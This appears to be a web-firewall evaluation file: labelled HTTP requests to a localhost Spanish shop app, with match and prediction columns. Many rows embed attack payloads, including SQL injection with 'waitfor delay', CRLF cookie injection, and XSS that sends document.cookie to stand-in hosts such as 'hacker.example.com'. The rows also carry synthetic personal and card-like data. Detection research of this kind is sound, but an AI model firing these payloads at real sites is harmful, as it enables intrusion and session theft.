,URL,Target,y_match,y_pred,WAffle
3605,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=rains8&password=atezada&nombre=Amine&apellidos=Deltell+Riberas&email=rodvold%40mytanga.om&dni=06044170T&direccion=Calle+Secretario+Aguilar+196%2C+4-C&ciudad=Ochagav%EDa%2FOtsagabia&cp=10691&provincia=M%E1laga&ntc=7645298155512025&B1=Registrar,0,0,0,0
3606,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,1,0,1,1
3607,http://localhost:8080/tienda1/global/menum.jsp,0,0,0,0
3608,http://localhost:8080/tienda1/publico/caracteristicas.jsp,1,0,1,1
3609,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8115&B1=Confirmar,0,0,0,0
3610,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=t%2Cele&password=cence%F1a&nombre=Constantino&apellidos=Solmoirago&email=russinov%40rubirubi.to&dni=93399532M&direccion=C%2F+Canal+De+Mozambique%2C+189+&ciudad=Viana+do+Bolo&cp=02151&provincia=Soria&ntc=9094758290703714&B1=Registrar,1,0,1,1
3611,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0,0,0,0
3612,http://localhost:8080/tienda1/miembros/fotos.jsp,0,0,0,0
3613,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1,0,1,1
3614,http://localhost:8080/iisadmpwd/aexp4.htr,1,0,1,1
3615,http://localhost:8080/tienda1/publico/autenticar.jsp,1,0,1,1
3616,http://localhost:8080/tienda1/4861362529278789730~,1,0,1,1
3617,http://localhost:8080/tienda1/publico/anadir.jsp,1,0,1,1
3618,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0,0,0,0
3619,http://localhost:8080/tienda1/miembros/index.jsp,0,0,0,0
3620,http://localhost:8080/tienda1/publico/entrar.jsp,1,0,1,1
3621,http://localhost:8080/tienda1~,1,0,1,1
3622,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0,0,0,0
3623,http://localhost:8080/tienda1/publico/anadir.jsp,0,0,1,1
3624,http://localhost:8080/iissamples/ExAir/FunNGames/FunNGames.asp,1,0,1,1
3625,http://localhost:8080/tienda1/index.jsp,0,0,0,0
3626,http://localhost:8080/tienda1/publico/pagar.jsp,1,0,1,1
3627,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=b%27il%3F%2Bi&password=as6m1r&nombre=D%E1maso&apellidos=Basas+Soto&email=alejandro-kurgic%40repretexbcn.cy&dni=69198356G&direccion=Av.+Valdecilla%2C+S%2FN+10-B&ciudad=Robladillo&cp=31520&provincia=La+Rioja&ntc=7775887552046645&B1=Registrar,1,0,1,1
3628,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A,1,0,1,1
3629,http://localhost:8080/tienda1/publico/caracteristicas.jsp,1,0,1,1
3630,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%2500,1,0,1,1
3631,http://localhost:8080/tienda1/global/titulo.jsp,0,0,0,0
3632,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=AND+1%3D1,1,0,1,1
3633,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=callos&pwd=pRoF%C9tICA&remember=off&B1=Entrar,0,0,0,0
3634,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85%2F&cantidad=77&B1=A%F1adir+al+carrito,1,0,1,1
3635,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectasany%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1,0,1,1
3636,http://localhost:8080/tienda1/imagenes/logo.gif,0,0,0,0
3637,http://localhost:8080/tienda1/imagenes/logo.gif,0,0,0,0
3638,http://localhost:8080/tienda1/publico/pagar.jsp,0,0,1,1
3639,http://localhost:8080/tienda1/imagenes/1.gif,0,0,0,0
3640,http://localhost:8080/tienda1/imagenes/3.gif,0,0,0,0
3641,http://localhost:8080/tienda1/index.jsp,0,0,0,0
3642,http://localhost:8080/asf-logo-wide.gif.bak,1,0,1,1
3643,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0,0,0,0
3644,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=heleen&pwd=castella8ismo&remember=on&B1A=Entrar,1,0,1,1
3645,http://localhost:8080/tienda1/global/creditos.jsp,0,0,0,0
3646,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=medioni5&password=%2Bfaccioso&nombre=Esdr%E1s&apellidos=Vi%F1oly+Belcastro&email=celeste_bryon%40skullride.ki&dni=98970543W&direccion=C%2F+Caridad+S%2FN+&ciudad=Campello%2C+el&cp=40184&provincia=Valladolid&ntc=1442431887503330&B1=Registrar,0,0,0,0
3647,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=chi-yin&password=zAfIo&nombre=Amael&apellidos=Casselle+Cullell&email=vacey%40madrid2012.kw&dni=70541156H&direccion=Plza.+Agueda+Diez%2C+25+10%3FB%7C&ciudad=Oria&cp=19415&provincia=Cantabria&ntc=0891865623205844&B1=Registrar,1,0,1,1
3648,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mile&pwd=DEs9I852d268%253F&remember=off&B1=Entrar,1,0,1,1
3649,http://localhost:8080/tienda1/publico/productos.jsp.old,1,0,1,1
3650,http://localhost:8080/tienda1/publico/anadir.jsp?id=2%2F&nombre=Queso+Manchego&precio=85&cantidad=15&B1=A%F1adir+al+carrito,1,0,1,1
3651,http://localhost:8080/tienda1/publico/productos.jsp,0,0,0,0
3652,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=AND+1%3D1,1,0,1,1
3653,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=71&B1=A%F1adir+al+carrito,1,0,1,1
3654,http://localhost:8080/tienda1/miembros/asf-logo-wide.gif.java,1,0,1,1
3655,http://localhost:8080/tienda1/imagenes/3.gif,0,0,0,0
3656,http://localhost:8080/tienda1/publico/vaciar.jsp,0,0,1,1
3657,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mariaele&passwordA=clErofObia&nombre=Royce&apellidos=Cornetero+Siruela&email=jager%40tresbrujas.hr&dni=41502558R&direccion=Calle+Pico+Mampodre+106%2C+&ciudad=Alhama+de+Arag%F3n&cp=01439&provincia=Barcelona&ntc=6736665084880306&B1=Registrar,1,0,1,1
3658,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Ques%2Bo+Manchego&precio=39&cantidad=33&B1=A%F1adir+al+carrito,1,0,1,1
3659,http://localhost:8080/tienda1/miembros/index.jsp,0,0,0,0
3660,http://localhost:8080/tienda1/miembros/fotos.jsp.INC,1,0,1,1
3661,http://localhost:8080/tienda1/miembros/fotos.jsp,0,0,0,0
3662,http://localhost:8080/tienda1/imagenes/cmenbul.gif,0,0,0,0
3663,http://localhost:8080/tienda1/publico/anadir.jsp,1,0,1,1
3664,http://localhost:8080/tienda1/miembros/editar.jsp,1,0,1,1
3665,http://localhost:8080/tienda1/global/titulo.jsp/asf-logo-wide.gif,1,0,1,1
3666,http://localhost:8080/tienda1/publico/vaciar.jsp,0,0,1,1
3667,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sanabria&pwd=s074ido3&remember=on&B1=Entrar,0,0,0,0
3668,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=snips&password=impenetr-abilidad&nombre=Kalanit&apellidos=Pin%F3s+Turrubiartes&email=ornellas3%40professionalhost.com.pro&dni=98057218F&direccion=Calle+Batalla+De+Otumba+26%2C+&ciudad=Lora+de+Estepa&cp=43120&provincia=Salamanca&ntc=3586735536952135&B1=Registrar,0,0,0,0
3669,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=davin%27der&pwd=engrE%D1adO&remember=off&B1=Entrar,1,0,1,1
3670,http://localhost:8080/tienda1/miembros/index.jsp.Inc,1,0,1,1
3671,http://localhost:8080/tienda1/publico/entrar.jsp,0,0,1,1
3672,http://localhost:8080/tienda1/publico/miembros.jsp,0,0,0,0
3673,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%253F,1,0,1,1
3674,http://localhost:8080/tienda1/miembros/fotos.jsp,0,0,0,0
3675,http://localhost:8080/tienda1/publico/registro.jsp,0,0,1,1
3676,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kammerer&password=recabdador&nombre=Michael&apellidos=Albuquerque+Periquet&email=ozmond-woolgar%40adscrito.tj&dni=98367013S&direccion=Urbanizacion+Ciudad+Residencial+Universitaria+58%2C+8%3FC&ciudad=Alobras&cp=43595&provincia=Le%F3n&ntc=8795473491595155&B1=Registrar,0,0,0,0
3677,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=saladna&passwordA=na6u40476a8i%F3n&nombre=Amranto&apellidos=Enjuanes+Corbi&email=tin%40velazquezlarra%F1aga.aw&dni=09894897K&direccion=C%2F+358+180+13%3FG&ciudad=Sanl%FAcar+de+Barrameda&cp=16118&provincia=Cuenca&ntc=1923588691952780&B1=Registrar,1,0,1,1
3678,http://localhost:8080/tienda1/imagenes/3.gif,0,0,0,0
3679,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tiong-ho&password=an1l5m9no&nombre=Hadasa&apellidos=Subias&email=parada.biuchet4%40aulahost.gw&dni=79845869N&direccion=Jacinto+Benavente%2C+165+7F&ciudad=Herreruela&cp=11330&provincia=Teruel&ntc=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&B1=Registrar,1,0,1,1
3680,http://localhost:8080/tienda1/global/creditos.jsp,0,0,0,0
3681,http://localhost:8080/tienda1/publico/entrar.jsp/,1,0,1,1
3682,http://localhost:8080/tienda1/publico/entrar.jsp,1,0,1,1
3683,http://localhost:8080/tienda1/global/creditos.jsp,0,0,0,0
3684,http://localhost:8080/tienda1/publico/autenticar.jsp,1,0,1,1
3685,http://localhost:8080/tienda1/publico/anadir.jsp,1,0,1,1
3686,http://localhost:8080/tienda1/global/creditos.jsp,0,0,0,0
3687,http://localhost:8080/tienda1/publico/pagar.jsp,1,0,1,1
3688,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=vahid&pwd=aT89A7218&remember=on&B1=Entrar,0,0,0,0
3689,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=maala8&password=CaSCabelA&nombre=Ludolfo&apellidos=Pe%F1uela+Sains&email=snerd%40bwds.tj&dni=15365381R&direccion=C%2F+57+15%2C+9G&ciudad=Regueras+de+Arriba&cp=08281&provincia=Ourense&ntc=2815170427897112&B1=Registrar,0,0,0,0
3690,http://localhost:8080/_cti_pvt/botinfs.cnf,1,0,1,1
3691,http://localhost:8080/tienda1/imagenes/3.gif,0,0,0,0
3692,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%4040,1,0,1,1
3693,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=onder&password=cORT%E9SMenTE&nombre=Pancracio&apellidos=Joves+Sagreras&email=darcy%40risiberia.gr&dni=20934634B&direccion=Pla%2Bza+Estacion+48%2C%2B+&ciudad=Santa+Croya+de+Tera&cp=13326&provincia=Zaragoza&ntc=7238071991283064&B1=Registrar,1,0,1,1
3694,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=rozele&password=eSPALDILla&nombre=Idefonsa&apellidos=Masaguer+Pardinas&email=frank%40soymuyguapa.tn&dni=44181680Z&direccion=C%2F+Don+Bosco+65%2C+10-D&ciudad=San+Lorenzo+de+la+Parrilla&cp=06519&provincia=Guadalajara&ntc=7254612789884855&B1=Registrar,0,0,0,0
3695,http://localhost:8080/tienda1/publico/anadir.jsp,1,0,1,1
3696,http://localhost:8080/tienda1/global/titulo.jsp,0,0,0,0
3697,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1,0,1,1
3698,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1008&B1=Confirmar,0,0,0,0
3699,http://localhost:8080/tienda1/publico/anadir.jsp,1,0,1,1
3700,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0,0,0,0
3701,http://localhost:8080/physican/login.do,1,0,1,1
3702,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6857&B1=Confirmar%2F,1,0,1,1
3703,http://localhost:8080/tienda1/publico/anadir.jsp,1,0,1,1
3704,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=towney&password=causa&nombre=An%EDbal&apellidos=Stange&email=stiefel8%40spainbareback.eu&dni=16157298M&direccion=Pla%E7a+Cesar+Vallejo%2C+58+&ciudad=Vilabella&cp=43427&provincia=C%E1ceres&ntc=9593063856723966&B1=Registrar,0,0,0,0
3705,http://localhost:8080/tienda1/publico/entrar.jsp,1,0,1,1
3706,http://localhost:8080/tienda1/publico/entrar.jsp,1,0,1,1
3707,http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=4564&B1=Confirmar,1,0,1,1
3708,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shiranth5&password=petal9192&nombre=Nelma&apellidos=Rayo+Jal%F3n&email=dubucourt-geoffrey%40intercambioenlaces.name&dni=75767112Y&direccion=Pla%E7a+D%27+Espanya+36+6-E&ciudad=Penagos&cp=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&provincia=M%E1laga&ntc=1634165251818381&B1=Registrar,1,1,1,1
3709,http://localhost:8080/tienda1/imagenes/1.gif,0,0,0,0
3710,http://localhost:8080/dspug.nsf,1,0,1,1
3711,http://localhost:8080/tienda1/index.jsp,0,0,0,0
3712,http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27+AND+%271%27%3D%271&precio=4011&B1=Confirmar,1,0,1,1
3713,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=olimpia&pwd=8i273e&remember=off&B1=Entrar,0,0,0,0
3714,http://localhost:8080/tienda1/imagenes/4861362529278789730~,1,0,1,1
3715,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=turnbull&pwd=babera&remember=on%2F&B1=Entrar,1,0,1,1
3716,http://localhost:8080/tienda1/imagenes/cmenbul.gif,0,0,0,0
3717,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%7C,1,0,1,1
3718,http://localhost:8080/tienda1/imagenes/1.gif,0,0,0,0
3719,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27INJECTED_PARAM,1,0,1,1
3720,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1328&B1=Confirmar%2F,1,0,1,1
3721,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3632&B1=Confirmar,0,0,0,0
3722,http://localhost:8080/tienda1/global/titulo.jsp,0,0,0,0
3723,http://localhost:8080/tienda1/publico/carrito.jsp,0,0,0,0
3724,http://localhost:8080/tienda1/publico/autenticar.jsp~,1,0,1,1
3725,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=%7C&login=akhtar6&pwd=56s5r6sa&remember=off&B1=Entrar,1,0,1,1
3726,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombreA=Vino+Rioja&precio=100&cantidad=56&B1=A%F1adir+al+carrito,1,0,1,1
3727,http://localhost:8080/tienda1/imagenes/logo.gif,0,0,0,0
3728,http://localhost:8080/tienda1/global/estilos.css,0,0,0,0
3729,http://localhost:8080/tienda1/publico/autenticar.jsp,1,0,1,1
3730,http://localhost:8080/tienda1/publico/entrar.jsp,0,0,1,1
3731,http://localhost:8080/tienda1/publico/autenticar.jsp,0,0,1,1
3732,http://localhost:8080/tienda1/imagenes/2.gif,0,0,0,0
3733,http://localhost:8080/tienda1/publico/caracteristicas.jsp,0,0,1,1
3734,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0,0,0,0
3735,http://localhost:8080/tienda1/miembros/fotos.jsp,0,0,0,0
3736,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0,0,0,0
3737,http://localhost:8080/tienda1/publico/pagar.jsp,1,0,1,1
3738,http://localhost:8080/tienda1/index.jsp,0,0,0,0
3739,http://localhost:8080/tienda1/imagenes/logo.gif,0,0,0,0
3740,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,1,0,1,1
3741,http://localhost:8080/tienda1/publico/carrito.jsp,0,0,0,0
3742,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=57&B1=any%250ASet-cookie%253A%2BTamper%253D1041264011025374727,1,0,1,1
3743,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3991&B1=Confirmar,0,0,0,0
3744,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A,1,0,1,1
3745,http://localhost:8080/tienda1/publico/vaciar.jsp,0,0,1,1
3746,http://localhost:8080/tienda1/global/menum.jsp,0,0,0,0
3747,http://localhost:8080/tienda1/miembros/index.jsp,0,0,0,0
3748,http://localhost:8080/tienda1/publico/anadir.jsp,1,0,1,1
3749,http://localhost:8080/tienda1/global/titulo.jsp,0,0,0,0
3750,http://localhost:8080/tienda1/miembros/editar.jsp,1,0,1,1
3751,http://localhost:8080/tienda1/publico/vaciar.jsp,1,0,1,1
3752,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0,0,0,0
3753,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100%2F&cantidad=58&B1=A%F1adir+al+carrito,1,0,1,1
3754,http://localhost:8080/tienda1/miembros/editar.jsp,0,0,1,1
3755,http://localhost:8080/tienda1/publico/registro.jsp,1,0,1,1
3756,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=melisse&pwd=pleit%E9s&remember=onAND+1%3D1&B1=Entrar,1,0,1,1
3757,http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0,0,0,0
3758,http://localhost:8080/tienda1/publico/pagar.jsp,1,0,1,1
3759,http://localhost:8080/tienda1/publico/vaciar.jsp,1,0,1,1
3760,http://localhost:8080/tienda1/publico/autenticar.jsp,1,0,1,1
3761,http://localhost:8080/tienda1/publico/anadir.jsp,0,0,1,1
3762,http://localhost:8080/tienda1/global/menum.jsp,0,0,0,0
3763,http://localhost:8080/tienda1/publico/carrito.jsp,0,0,0,0
3764,http://localhost:8080/iissamples/dfault/samples.asp,1,0,1,1
3765,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5607&B1=Pasar+por+caja%2F,1,0,1,1
3766,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0,0,0,0
3767,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0,0,0,0
3768,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0,0,0,0
3769,http://localhost:8080/tienda1/miembros/editar.jsp,0,0,1,1
3770,http://localhost:8080/tienda1/publico/anadir.jsp,1,0,1,1
3771,http://localhost:8080/tienda1/publico/entrar.jsp,0,0,1,1
3772,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=stephan&password=alfeiza&nombre=Silde&apellidos=Bayarri+Bach&email=lilien%40aprendeaestudiar.lt&dni=68252027X&direccion=Carrer+Riu+Sena+S%2FN+13-C&ciudad=Pedroso&cp=05296&provincia=Alicante&ntc=1350447535832439&B1=Registrar,0,0,0,0
3773,http://localhost:8080/tienda1/miembros/salir.jsp,0,0,0,0
3774,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=323&B1=Pasar+por+caja%2F,1,0,1,1
3775,http://localhost:8080/tienda1/imagenes/1.gif,0,0,0,0
3776,http://localhost:8080/tienda1/imagenes/logo.gif,0,0,0,0
3777,http://localhost:8080/tienda1/publico/registro.jsp,1,0,1,1
3778,http://localhost:8080/tienda1/publico/miembros.jsp,0,0,0,0
3779,http://localhost:8080/tienda1/publico/anadir.jsp,0,0,1,1
3780,http://localhost:8080/tienda1/publico/anadir.jsp,0,0,1,1
3781,http://localhost:8080/admin/secure/logon.jsp,1,0,1,1
3782,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=feutlins&pwd=laga_rtijo&remember=on&B1=Entrar,0,0,0,0
3783,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0,0,0,0
3784,http://localhost:8080/tienda1/miembros/index.jsp,0,0,0,0
3785,http://localhost:8080/tienda1/imagenes/3.gif,0,0,0,0
3786,http://localhost:8080/tienda1/publico/miembros.jsp,0,0,0,0
3787,http://localhost:8080/tienda1/global/titulo.jsp,0,0,0,0
3788,http://localhost:8080/tienda1/global/creditos.jsp,0,0,0,0
3789,http://localhost:8080/tienda1/publico/autenticar.jsp,1,0,1,1
3790,http://localhost:8080/tienda1/imagenes/logo.gif,0,0,0,0
3791,http://localhost:8080/tienda1/imagenes/2.gif,0,0,0,0
3792,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=transki&pwd=4At4pL%E1n&remember=off&B1=Entrar,0,0,0,0
3793,http://localhost:8080/tienda1/miembros/index.jsp,0,0,0,0
3794,http://localhost:8080/tienda1/imagenes/cmenbul.gif,0,0,0,0
3795,http://localhost:8080/tienda1/publico/entrar.jsp,0,0,1,1
3796,http://localhost:8080/tienda1/publico/entrar.jsp,0,0,1,1
3797,http://localhost:8080/tienda1/global/titulo.jsp,0,0,0,0
3798,http://localhost:8080/tienda1/miembros/index.jsp,0,0,0,0
3799,http://localhost:8080/tienda1/publico/anadir.jsp,0,0,1,1
3800,http://localhost:8080/tienda1/global/creditos.jsp,0,0,0,0
3801,http://localhost:8080/WebSphereSamples/,1,0,1,1
3802,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,1,0,1,1
3803,http://localhost:8080/tienda1/publico/caracteristicas.jsp,0,0,1,1
3804,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=siham&password=enat%EDametn%21e&nombre=Ces%E1rio&apellidos=Castany+Bigorra&email=mangini%40cubiertoscbb.an&dni=93029703Q&direccion=Calle+Rio+Guadajira+182+7-H&ciudad=Codosera%2C+La&cp=22314%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&provincia=Salamanca&ntc=9377074508770290&B1=Registrar,1,0,1,1
3805,http://localhost:8080/tienda1/global/titulo.jsp,0,0,0,0
3806,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0,0,0,0
3807,http://localhost:8080/tienda1/imagenes/cmenbul.gif,0,0,0,0
3808,http://localhost:8080/tienda1/miembros/fotos.jsp,0,0,0,0
3809,http://localhost:8080/tienda1/imagenes/cmenbul.gif,0,0,0,0
3810,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,1,0,1,1
3811,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0,0,0,0
3812,http://localhost:8080/tienda1/publico/entrar.jsp,1,0,1,1
3813,http://localhost:8080/tienda1/miembros/editar.jsp.inc,1,0,1,1
3814,http://localhost:8080/tienda1/imagenes/2.gif,0,0,0,0
3815,http://localhost:8080/tienda1/imagenes/2.gif,0,0,0,0
3816,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=corissa&password=cipresino&nombre=Cenobio&apellidos=La+Ringa+Chinchilla&email=plate%40pecher.mx&dni=16052504E&direccion=Torres+Quevedo%2C+143+10%3FB&ciudad=Casas+de+Juan+N%FA%F1ez&cp=31480&provincia=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E&ntc=1974630082144363&B1=Registrar,1,0,1,1
